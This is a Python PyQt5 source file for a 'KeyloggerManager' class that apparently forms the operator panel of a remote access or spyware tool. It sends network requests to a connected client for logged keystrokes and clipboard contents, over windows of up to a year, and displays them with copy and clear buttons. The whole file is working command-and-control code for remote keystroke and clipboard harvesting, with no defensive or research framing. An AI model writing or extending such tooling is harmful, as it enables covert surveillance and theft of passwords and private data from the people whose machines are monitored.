import functools
import threading
from PyQt5.QtCore import pyqtSignal, QObject
import GUIHelpers
import InspectionWindowController
from NetProtocol import *
import pyperclip3 as pyperclip

class KeyloggerManager(QObject):
    refresh_signal = pyqtSignal(str, str)

    def __init__(self, client, inspector_controller):
        super().__init__()
        self.inspector_controller = inspector_controller
        self.client = client
        self.time_possibilies = ['15m', "1H", "1D", "1W", "1M", "1Y"]
        self.initialized = False
        self.refresh_signal.connect(self.refresh_signal_emitted)
        self.inspector_controller.view.keyloggerRefreshButton.clicked.connect(functools.partial(self.refresh, self.time_possibilies[0], "keylogger"))
        self.inspector_controller.view.clipboardRefreshButton.clicked.connect(functools.partial(self.refresh, self.time_possibilies[0], "clipboard"))
        self.inspector_controller.view.keyloggerClearButton.clicked.connect(lambda: self.inspector_controller.view.keyloggerTextEdit.clear())
        self.inspector_controller.view.clipboardClearButton.clicked.connect(lambda: self.inspector_controller.view.clipboardTextEdit.clear())
        self.inspector_controller.view.clipboardCopyButton.clicked.connect(lambda: pyperclip.copy(self.inspector_controller.view.clipboardTextEdit.toPlainText()))
        self.inspector_controller.view.keyloggerCopyButton.clicked.connect(lambda: pyperclip.copy(self.inspector_controller.view.keyloggerTextEdit.toPlainText()))

    def refresh(self, time, type):
        def _refresh(client, time, refresh_signal):
            # if refresh keylogger
            if type == "keylogger":
                event = client.send_message(NetMessage(NetTypes.NetRequest, NetTypes.NetGetKeylogger, extra=str(time)), track_event=True)
            # if refresh clipboard
            else:
                event = client.send_message(NetMessage(NetTypes.NetRequest, NetTypes.NetGetClipboard, extra=str(time)), track_event=True)
            event.wait()
            data = event.get_data()
            if data is not None:
                if isinstance(data, NetText):
                    refresh_signal.emit(type, data.text)
        thread = threading.Thread(target=_refresh, args=(self.client, time, self.refresh_signal))
        thread.start()

    def refresh_signal_emitted(self, type, text):
        if type == "keylogger":
            self.inspector_controller.view.keyloggerTextEdit.setText(text)
        # if clipboard
        else:
            self.inspector_controller.view.clipboardTextEdit.setText(text)

    def tab_entered(self):
        if not self.initialized:
            self.initialized = True
            self.refresh(self.time_possibilies[0], "keylogger")
            self.refresh(self.time_possibilies[0], "clipboard")

    def tab_closed(self):
        pass